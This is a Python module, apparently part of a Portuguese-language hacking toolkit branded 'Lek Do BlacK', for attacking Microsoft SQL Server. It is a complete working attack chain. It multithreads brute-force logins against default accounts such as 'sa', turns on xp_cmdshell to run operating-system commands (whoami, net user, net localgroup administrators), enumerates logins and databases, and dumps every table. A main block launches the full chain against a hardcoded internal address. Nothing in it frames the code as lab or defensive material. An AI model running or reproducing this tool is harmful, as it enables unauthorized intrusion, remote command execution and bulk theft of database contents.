# core/mssql_exploit.py
# -*- coding: utf-8 -*-
# [Lek Do BlacK] - MSSQL EXPLOITATION SPECIALIZED MODULE
# Exploração ESPECÍFICA para Microsoft SQL Server

import pymssql
import socket
from concurrent.futures import ThreadPoolExecutor
import subprocess
import re
import xml.etree.ElementTree as ET
from urllib.parse import quote
import time

class MSSQLExploiter:
    def __init__(self):
        self.common_errors = [
            'Microsoft SQL Server', 'SQL Server', 'ODBC Driver',
            'SQLException', 'syntax error', 'SQLSTATE', 'Login failed',
            'xp_cmdshell', 'sys.sql_logins', 'information_schema'
        ]
        
        self.mssql_ports = [1433, 1434, 1435, 1436, 1437, 1438, 1439]
        
    def connect_mssql(self, target, port=1433, username=None, password=None, timeout=5):
        """Conecta no MSSQL usando pymssql"""
        try:
            conn = pymssql.connect(
                server=target,
                port=port,
                user=username,
                password=password,
                login_timeout=timeout,
                timeout=timeout
            )
            return conn
        except pymssql.OperationalError as e:
            if 'Login failed' in str(e):
                return None
            raise e
        except Exception as e:
            return None
    
    def test_mssql_connection(self, target, port=1433):
        """Testa se a porta MSSQL está respondendo"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((target, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def brute_force_mssql(self, target, port=1433, users_file='wordlists/usuarios.txt', 
                         passwords_file='wordlists/senhas.txt'):
        """Força bruta ESPECÍFICA para MSSQL"""
        successful_logins = []
        
        # Carrega wordlists
        try:
            with open(users_file, 'r', encoding='utf-8', errors='ignore') as f:
                users = [line.strip() for line in f if line.strip()]
        except:
            users = ['sa', 'admin', 'administrator', 'test', 'user']
        
        try:
            with open(passwords_file, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except:
            passwords = ['', '123456', 'password', 'admin', '12345']
        
        print(f"[+] Iniciando brute force MSSQL em {target}:{port}")
        print(f"[+] Users: {len(users)}, Passwords: {len(passwords)}")
        
        def try_login(user, password):
            try:
                conn = self.connect_mssql(target, port, user, password)
                if conn:
                    result = {
                        'target': target,
                        'port': port,
                        'user': user,
                        'password': password,
                        'success': True
                    }
                    
                    # Tenta obter informações adicionais
                    try:
                        cursor = conn.cursor()
                        cursor.execute("SELECT @@version")
                        version = cursor.fetchone()[0]
                        result['version'] = version
                        
                        cursor.execute("SELECT IS_SRVROLEMEMBER('sysadmin')")
                        is_admin = cursor.fetchone()[0]
                        result['is_admin'] = bool(is_admin)
                        
                    except:
                        pass
                    
                    conn.close()
                    return result
            except:
                pass
            return None
        
        # Threading para brute force massivo
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for user in users:
                for password in passwords:
                    futures.append(executor.submit(try_login, user, password))
            
            for future in futures:
                result = future.result()
                if result and result['success']:
                    successful_logins.append(result)
                    print(f"[+] CREDENCIAL VÁLIDA: {result['user']}:{result['password']}")
                    if result.get('is_admin'):
                        print(f"[!] PRIVILÉGIOS DE ADMIN ENCONTRADOS!")
        
        return successful_logins
    
    def enable_xp_cmdshell(self, target, port, username, password):
        """Habilita xp_cmdshell no MSSQL"""
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return False
            
            cursor = conn.cursor()
            
            # Comandos para habilitar xp_cmdshell
            commands = [
                "EXEC sp_configure 'show advanced options', 1;",
                "RECONFIGURE;",
                "EXEC sp_configure 'xp_cmdshell', 1;",
                "RECONFIGURE;"
            ]
            
            for cmd in commands:
                cursor.execute(cmd)
            
            conn.commit()
            conn.close()
            print(f"[+] xp_cmdshell habilitado com sucesso em {target}")
            return True
            
        except Exception as e:
            print(f"[-] Erro ao habilitar xp_cmdshell: {str(e)}")
            return False
    
    def execute_via_xp_cmdshell(self, target, port, username, password, command):
        """Executa comandos via xp_cmdshell"""
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return None
            
            cursor = conn.cursor()
            
            # Executa comando
            cursor.execute(f"EXEC xp_cmdshell '{command}'")
            results = cursor.fetchall()
            
            conn.close()
            
            # Processa resultados
            output = []
            for row in results:
                if row and row[0]:
                    output.append(str(row[0]))
            
            return '\n'.join(output)
            
        except Exception as e:
            return f"Erro: {str(e)}"
    
    def extract_database_info(self, target, port, username, password):
        """Extrai informações do banco MSSQL"""
        info = {}
        
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return info
            
            cursor = conn.cursor()
            
            # Informações da instância
            cursor.execute("SELECT @@version")
            info['version'] = cursor.fetchone()[0]
            
            cursor.execute("SELECT @@servername")
            info['servername'] = cursor.fetchone()[0]
            
            # Lista bancos de dados
            cursor.execute("SELECT name FROM sys.databases")
            info['databases'] = [row[0] for row in cursor.fetchall()]
            
            # Lista usuários
            cursor.execute("SELECT name FROM sys.sql_logins")
            info['users'] = [row[0] for row in cursor.fetchall()]
            
            # Tabelas de cada database
            info['tables'] = {}
            for db in info['databases']:
                if db not in ['master', 'tempdb', 'model', 'msdb']:
                    try:
                        cursor.execute(f"USE {db}; SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES")
                        tables = [row[0] for row in cursor.fetchall()]
                        info['tables'][db] = tables
                    except:
                        continue
            
            conn.close()
            
        except Exception as e:
            info['error'] = str(e)
        
        return info
    
    def dump_database(self, target, port, username, password, database):
        """Faz dump completo de um database"""
        dump_data = {}
        
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return dump_data
            
            cursor = conn.cursor()
            cursor.execute(f"USE {database}")
            
            # Lista tabelas
            cursor.execute("SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES")
            tables = [row[0] for row in cursor.fetchall()]
            
            for table in tables:
                try:
                    cursor.execute(f"SELECT * FROM {table}")
                    rows = cursor.fetchall()
                    
                    # Obtém nomes das colunas
                    cursor.execute(f"""
                        SELECT COLUMN_NAME 
                        FROM INFORMATION_SCHEMA.COLUMNS 
                        WHERE TABLE_NAME = '{table}'
                    """)
                    columns = [row[0] for row in cursor.fetchall()]
                    
                    dump_data[table] = {
                        'columns': columns,
                        'data': rows
                    }
                    
                except Exception as e:
                    print(f"[-] Erro ao dump table {table}: {str(e)}")
                    continue
            
            conn.close()
            
        except Exception as e:
            print(f"[-] Erro no dump do database {database}: {str(e)}")
        
        return dump_data
    
    def test_sql_injection(self, target, port, username, password, query):
        """Testa injeção SQL diretamente no MSSQL"""
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return None
            
            cursor = conn.cursor()
            cursor.execute(query)
            
            if cursor.description:  # Se retorna resultados
                results = cursor.fetchall()
                return results
            else:
                return "Query executada com sucesso"
            
            conn.close()
            
        except Exception as e:
            return f"Erro: {str(e)}"
    
    def check_vulnerabilities(self, target, port, username, password):
        """Verifica vulnerabilidades específicas do MSSQL"""
        vulns = []
        
        try:
            conn = self.connect_mssql(target, port, username, password)
            if not conn:
                return vulns
            
            cursor = conn.cursor()
            
            # Verifica se xp_cmdshell está habilitado
            cursor.execute("SELECT value_in_use FROM sys.configurations WHERE name = 'xp_cmdshell'")
            xp_cmdshell = cursor.fetchone()
            if xp_cmdshell and xp_cmdshell[0] == 1:
                vulns.append("xp_cmdshell habilitado")
            
            # Verifica configurações perigosas
            dangerous_configs = [
                'show advanced options',
                'Ole Automation Procedures',
                'remote access',
                'remote admin connections'
            ]
            
            for config in dangerous_configs:
                cursor.execute(f"SELECT value_in_use FROM sys.configurations WHERE name = '{config}'")
                result = cursor.fetchone()
                if result and result[0] == 1:
                    vulns.append(f"{config} habilitado")
            
            conn.close()
            
        except Exception as e:
            print(f"[-] Erro ao verificar vulnerabilidades: {str(e)}")
        
        return vulns
    
    def automated_mssql_attack(self, target, port=1433):
        """Ataque automatizado completo no MSSQL"""
        print(f"[+] Iniciando ataque automatizado MSSQL em {target}:{port}")
        
        results = {
            'target': target,
            'port': port,
            'credentials': [],
            'vulnerabilities': [],
            'database_info': {},
            'dump_data': {}
        }
        
        # 1. Brute force
        results['credentials'] = self.brute_force_mssql(target, port)
        
        if results['credentials']:
            # Pega primeira credencial válida
            cred = results['credentials'][0]
            user = cred['user']
            password = cred['password']
            
            # 2. Extrai informações do banco
            print(f"[+] Extraindo informações do banco...")
            results['database_info'] = self.extract_database_info(target, port, user, password)
            
            # 3. Verifica vulnerabilidades
            print(f"[+] Verificando vulnerabilidades...")
            results['vulnerabilities'] = self.check_vulnerabilities(target, port, user, password)
            
            # 4. Tenta habilitar xp_cmdshell se não estiver habilitado
            if 'xp_cmdshell habilitado' not in results['vulnerabilities']:
                print(f"[+] Tentando habilitar xp_cmdshell...")
                if self.enable_xp_cmdshell(target, port, user, password):
                    results['vulnerabilities'].append("xp_cmdshell habilitado via exploit")
            
            # 5. Executa comandos se xp_cmdshell estiver disponível
            if any('xp_cmdshell' in vuln for vuln in results['vulnerabilities']):
                print(f"[+] Executando comandos via xp_cmdshell...")
                commands = [
                    'whoami',
                    'ipconfig /all',
                    'net user',
                    'net localgroup administrators'
                ]
                
                for cmd in commands:
                    result = self.execute_via_xp_cmdshell(target, port, user, password, cmd)
                    print(f"[+] Comando '{cmd}': {result[:100]}...")
            
            # 6. Dump de databases interessantes
            print(f"[+] Realizando dump de databases...")
            for db in results['database_info'].get('databases', []):
                if db not in ['master', 'tempdb', 'model', 'msdb']:
                    print(f"[+] Dump database: {db}")
                    dump = self.dump_database(target, port, user, password, db)
                    if dump:
                        results['dump_data'][db] = dump
        
        return results

# Exemplo de uso rápido
if __name__ == "__main__":
    exploiter = MSSQLExploiter()
    
    # Teste rápido
    target = "192.168.1.100"
    port = 1433
    
    if exploiter.test_mssql_connection(target, port):
        print(f"[+] MSSQL detectado em {target}:{port}")
        results = exploiter.automated_mssql_attack(target, port)
        print(f"[+] Ataque concluído! Resultados salvos.")
    else:
        print(f"[-] MSSQL não encontrado em {target}:{port}")